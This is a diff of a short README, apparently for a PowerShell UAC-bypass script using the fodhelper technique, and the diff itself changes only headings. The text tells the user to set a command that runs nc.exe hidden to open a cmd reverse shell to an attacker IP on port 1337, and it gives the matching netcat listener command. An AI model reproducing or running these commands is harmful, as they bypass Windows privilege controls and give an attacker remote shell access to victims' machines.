@@ -1,13 +1,12 @@
 # Bypass UAC 
 
-### Method 1
 Before importing the file, please edit the "**BypassUACfodhelper.ps1**" file in the following section:: 
 
 ```
 $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
 ```
 
-#### Execute:
+### Execute:
 ```
 kali@unix:/$ rlwrap nc -lvp 1337
 ```
